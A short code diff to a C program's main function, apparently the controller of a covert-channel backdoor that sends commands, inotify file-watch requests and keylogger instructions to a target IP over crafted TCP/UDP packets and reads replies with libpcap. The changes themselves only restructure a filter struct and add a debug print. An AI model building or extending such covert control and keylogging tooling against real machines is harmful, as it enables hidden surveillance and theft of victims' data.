@@ -38,7 +38,6 @@ int main(int argc, char **argv){
     char pcapfilter[BUFSIZ];
     char file[BUFSIZ];
     char directory[BUFSIZ];
-    struct filter Filter;
     bool tcp = false, if_directory = false, if_file = false, if_command = false, if_keylogger = false;
     /* make sure user has root privilege */
     if(geteuid() != 0) {
@@ -93,7 +92,12 @@ int main(int argc, char **argv){
 
 
     //create filter (tcp/udp, command, ip, port)
-    Filter = InitFilter(targetip, localip, false, tcp);
+    struct filter *Filter = (struct filter*) malloc(sizeof(struct filter));
+    Filter->infected = false;
+    strncpy(Filter->targetip, targetip, BUFSIZ);
+    strncpy(Filter->localip, localip, BUFSIZ);
+    Filter->tcp = tcp;
+
     CreateFilter(pcapfilter, tcp);
     printf("Filter: %s\n",pcapfilter);
 
@@ -114,13 +118,13 @@ int main(int argc, char **argv){
     //INOTIFY
     } else if(if_file == true && if_directory == true) {
         snprintf(data, BUFSIZ, "%s\n%s", directory, file);
+        printf("data: %s\n", data);
 
         if(tcp == true) {
             covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
             covert_send(localip, targetip, UPORT, UPORT, data, EOT);
         } else {
             covert_udp_send_data(localip, targetip, UPORT, UPORT, data, INOTIFY);   //also sends EOT
-
         }
 
     //KEYLOGGER
@@ -134,7 +138,7 @@ int main(int argc, char **argv){
 
 
     //libpcap (tcp/udp, command)
-    Packetcapture(pcapfilter,Filter);
+    Packetcapture(pcapfilter, Filter);
 
     return 0;
 }
